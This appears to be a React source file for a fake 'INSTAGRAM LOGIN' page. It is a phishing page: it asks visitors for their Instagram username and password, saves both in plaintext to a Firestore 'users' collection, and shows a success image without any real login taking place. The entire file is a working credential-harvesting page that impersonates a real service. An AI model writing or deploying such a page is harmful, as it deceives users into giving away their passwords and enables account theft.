import "./App.css";
import { useState } from "react";
import { collection, addDoc } from "firebase/firestore";
import { db } from "./firebase";

function App() {
  const [submitted, setSubmitted] = useState(false);
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();

    try {
      // Save form data to Firestore
      await addDoc(collection(db, "users"), {
        username,
        password,
        createdAt: new Date(),
      });

      console.log("Data saved successfully");

      setSubmitted(true);
    } catch (error) {
      console.error("Error saving data:", error);
    }
  };

  if (submitted) {
    return (
      <div className="container">
        <img
          src="/success.png"
          alt="Success"
          className="success-image"
        />
      </div>
    );
  }

  return (
    <div className="container">
      <div className="header">
        <img
          src="/logo.png"
          alt="Logo"
          className="logo"
        />
        <h1>INSTAGRAM LOGIN</h1>
      </div>

      <p>Please enter valid credentials below.</p>

      <br />

      <label>Username :</label>
      <input
        type="text"
        value={username}
        onChange={(e) => setUsername(e.target.value)}
      />

      <br />
      <br />

      <label>Password :</label>
      <input
        type="password"
        value={password}
        onChange={(e) => setPassword(e.target.value)}
      />

      <br />
      <br />

      <button onClick={handleLogin}>LOGIN</button>
    </div>
  );
}

export default App;